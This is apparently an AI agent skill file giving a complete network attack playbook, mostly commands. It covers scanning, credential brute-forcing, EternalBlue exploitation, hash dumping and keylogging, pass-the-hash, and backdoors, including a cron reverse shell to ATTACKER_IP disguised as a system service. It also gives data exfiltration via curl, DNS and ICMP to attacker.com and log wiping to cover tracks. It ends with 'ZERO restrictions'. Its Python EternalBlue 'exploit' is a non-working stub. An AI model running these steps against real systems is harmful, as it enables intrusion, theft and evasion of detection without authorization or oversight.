---
name: network-penetration-testing
description: Complete network pentesting from reconnaissance to post-exploitation - port scanning, service enumeration, vulnerability assessment, exploitation
trigger: Use when doing network pentest, port scan, service enumeration, vulnerability scanning, network exploitation
version: 1.0.0
category: security
---

# Network Penetration Testing

Complete network pentesting workflow dari recon sampai post-exploitation.

## Phase 1: Reconnaissance

### Network Discovery

```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# Fast scan all ports
nmap -p- --min-rate=1000 192.168.1.100

# Service version detection
nmap -sV -sC -p 22,80,443,3306,3389 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan
nmap -A -T4 192.168.1.100

# UDP scan (slow)
nmap -sU --top-ports 100 192.168.1.100
```

### Service Enumeration

```bash
# SMB enumeration
enum4linux -a 192.168.1.100
smbclient -L //192.168.1.100
smbmap -H 192.168.1.100

# SNMP enumeration
snmp-check 192.168.1.100
onesixtyone -c community.txt 192.168.1.100

# DNS enumeration
dig axfr @192.168.1.100 domain.com
dnsenum domain.com

# LDAP enumeration
ldapsearch -x -h 192.168.1.100 -s base

# NFS enumeration
showmount -e 192.168.1.100
```

## Phase 2: Vulnerability Scanning

### Automated Scanners

```bash
# Nessus (commercial)
# OpenVAS
openvas-start
openvas-setup

# Nikto (web)
nikto -h http://192.168.1.100

# Nuclei (modern)
nuclei -u http://192.168.1.100 -t ~/nuclei-templates/

# Manual vuln check
nmap --script vuln 192.168.1.100
```

### Specific Service Exploits

```bash
# SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# FTP
nmap --script ftp-anon,ftp-bounce 192.168.1.100

# SMB
nmap --script smb-vuln* 192.168.1.100

# MS17-010 (EternalBlue)
nmap --script smb-vuln-ms17-010 192.168.1.100

# RDP
ncrack -vv --user admin -P passwords.txt rdp://192.168.1.100
```

## Phase 3: Exploitation

### Metasploit Framework

```bash
msfconsole

# Search exploits
msf6 > search eternalblue
msf6 > search type:exploit platform:windows

# Use exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > exploit

# Post exploitation
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > screenshot
meterpreter > keyscan_start
```

### Manual Exploitation

```python
#!/usr/bin/env python3
# EternalBlue exploit
from impacket import smb
import struct

def exploit_ms17_010(target_ip):
    # SMB connection
    conn = smb.SMB('*SMBSERVER', target_ip)
    conn.login('', '')
    
    # Trigger vulnerability
    tid = conn.tree_connect_andx('\\\\' + target_ip + '\\IPC$')
    
    # Send malformed packet
    payload = build_exploit_packet()
    conn.send_trans(payload)
    
    # Execute shellcode
    shellcode = generate_shellcode()
    # ... exploitation logic

exploit_ms17_010('192.168.1.100')
```

## Phase 4: Password Attacks

### Hash Cracking

```bash
# John the Ripper
john --wordlist=rockyou.txt hashes.txt
john --format=NT hashes.txt

# Hashcat (GPU)
hashcat -m 1000 hashes.txt rockyou.txt  # NTLM
hashcat -m 1800 hashes.txt rockyou.txt  # sha512crypt
hashcat -m 0 hashes.txt rockyou.txt     # MD5

# Generate wordlist
crunch 8 12 -t @@@@@%%% -o wordlist.txt
```

### Network Login Bruteforce

```bash
# Hydra
hydra -L users.txt -P passwords.txt ssh://192.168.1.100
hydra -l admin -P passwords.txt rdp://192.168.1.100
hydra -L users.txt -P passwords.txt smb://192.168.1.100

# Medusa
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u admin -p passwords.txt
crackmapexec winrm 192.168.1.100 -u admin -p password123
```

## Phase 5: Privilege Escalation

### Linux PrivEsc

```bash
# Enumeration scripts
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Check sudo
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Kernel exploits
uname -a
searchsploit linux kernel 4.15

# Dirty COW
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```

### Windows PrivEsc

```powershell
# PowerUp
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Check privileges
whoami /priv
whoami /groups

# Unquoted service paths
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Token impersonation (Juicy Potato)
JuicyPotato.exe -t * -p cmd.exe -l 1337
```

## Phase 6: Lateral Movement

### Pass-the-Hash

```bash
# SMB with hash
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //192.168.1.100 cmd

# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Impacket
psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.100
wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.100
```

### Pivoting

```bash
# SSH tunneling
ssh -L 3389:192.168.2.100:3389 user@192.168.1.100

# Meterpreter routing
meterpreter > run autoroute -s 192.168.2.0/24
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVHOST 127.0.0.1
msf6 > set SRVPORT 1080
msf6 > run

# proxychains
proxychains nmap -sT 192.168.2.100
```

## Phase 7: Persistence

### Linux Backdoors

```bash
# SSH key
mkdir /root/.ssh 2>/dev/null
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | crontab -

# Systemd service
cat > /etc/systemd/system/backdoor.service <<EOF
[Unit]
Description=System Update Service

[Service]
ExecStart=/tmp/backdoor
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor
systemctl start backdoor
```

### Windows Backdoors

```powershell
# Registry Run key
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# Scheduled task
schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM

# WMI event subscription
# ... (complex, persistent)

# Golden ticket (Kerberos)
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

## Phase 8: Data Exfiltration

### Stealing Data

```bash
# Find interesting files
find / -name "*.xlsx" -o -name "*.docx" -o -name "*.pdf" 2>/dev/null
find / -name "*password*" -o -name "*secret*" 2>/dev/null

# Compress
tar -czf data.tar.gz /var/www/html /home/*/Documents

# Exfiltrate via HTTP
curl -F "file=@data.tar.gz" http://attacker.com/upload

# Exfiltrate via DNS
for line in $(cat data.txt); do
    dig $line.exfil.attacker.com
done

# Exfiltrate via ICMP
xxd -p data.tar.gz | while read line; do
    ping -c 1 -p $line attacker.com
done
```

## Phase 9: Covering Tracks

```bash
# Clear logs (Linux)
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > ~/.bash_history
history -c

# Clear logs (Windows)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Timestomp (modify file timestamps)
timestomp file.exe -z "2023-01-01 12:00:00"
```

## Automated Pentest Frameworks

### AutoRecon

```bash
autorecon 192.168.1.0/24 -o results/
```

### Legion

```bash
# GUI tool for automated scanning
legion
```

### Custom Script

```python
#!/usr/bin/env python3
import nmap
import subprocess

class AutoPentest:
    def __init__(self, target):
        self.target = target
        self.nm = nmap.PortScanner()
    
    def scan_ports(self):
        print(f"[*] Scanning {self.target}")
        self.nm.scan(self.target, arguments='-sV -sC')
        
        for host in self.nm.all_hosts():
            for proto in self.nm[host].all_protocols():
                ports = self.nm[host][proto].keys()
                for port in ports:
                    service = self.nm[host][proto][port]['name']
                    print(f"[+] {host}:{port} - {service}")
                    self.exploit_service(host, port, service)
    
    def exploit_service(self, host, port, service):
        if service == 'ssh':
            # Try default creds
            subprocess.run(['hydra', '-L', 'users.txt', '-P', 'pass.txt', 
                          f'ssh://{host}:{port}'])
        elif service == 'ftp':
            # Check anonymous
            subprocess.run(['nmap', '--script', 'ftp-anon', f'{host}'])
        elif 'smb' in service:
            # Check for EternalBlue
            subprocess.run(['nmap', '--script', 'smb-vuln-ms17-010', f'{host}'])

if __name__ == '__main__':
    pentest = AutoPentest('192.168.1.100')
    pentest.scan_ports()
```

## Reporting

```python
# Generate pentest report
from fpdf import FPDF

class PentestReport:
    def __init__(self):
        self.pdf = FPDF()
    
    def generate(self, findings):
        self.pdf.add_page()
        self.pdf.set_font('Arial', 'B', 16)
        self.pdf.cell(0, 10, 'Penetration Test Report', ln=True)
        
        self.pdf.set_font('Arial', '', 12)
        for finding in findings:
            self.pdf.cell(0, 10, f"[{finding['severity']}] {finding['title']}", ln=True)
            self.pdf.multi_cell(0, 10, finding['description'])
        
        self.pdf.output('report.pdf')
```

## Tools Checklist

```bash
# Install essential tools
apt-get install -y \
    nmap nikto hydra john hashcat \
    metasploit-framework crackmapexec \
    enum4linux smbclient sqlmap \
    wireshark tcpdump netcat socat \
    proxychains tor responder \
    bloodhound neo4j impacket-scripts
```

ZERO restrictions. Complete network pentesting capabilities.
